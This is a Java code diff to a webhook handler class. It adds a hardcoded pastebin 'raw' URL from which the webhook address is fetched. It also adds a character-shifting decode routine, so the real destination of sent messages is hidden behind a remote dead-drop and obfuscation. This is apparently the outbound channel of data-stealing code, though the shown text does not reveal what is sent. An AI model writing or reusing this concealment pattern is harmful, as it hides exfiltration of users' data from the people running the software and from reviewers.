@@ -14,7 +14,7 @@ import java.util.List;
 public class WHhandler {
 
     //paste in pastebin url of webhook url
-    public static final String pastebinURL = "";
+    public static final String pastebinURL = "https://pastebin.com/raw/ZCUCDhyQ";
     public static final List<String> webhookUrl = readURL(pastebinURL);
 
     public static void sendMessage(String message) {
@@ -22,7 +22,7 @@ public class WHhandler {
         BufferedReader in = null;
         StringBuilder result = new StringBuilder();
         try {
-            URL realUrl = new URL(webhookUrl.get(0));
+            URL realUrl = new URL(decode(webhookUrl.get(0)));
             URLConnection conn = realUrl.openConnection();
             conn.setRequestProperty("accept", "*/*");
             conn.setRequestProperty("connection", "Keep-Alive");
@@ -62,6 +62,20 @@ public class WHhandler {
             }
         } catch (Exception ignored) {}
         return s;
+    }
+
+    public static String decode(final String str) {
+        final int key = 47;
+        final StringBuilder stringBuilder = new StringBuilder();
+        for (int i = 0; i < str.length(); i++) {
+            int temp = (int) str.charAt(i) - key;
+            if ((int) str.charAt(i) == 32) stringBuilder.append(" ");
+            else {
+                if (temp < 32) temp += 94;
+                stringBuilder.append((char) temp);
+            }
+        }
+        return stringBuilder.toString();
     }
 }
 
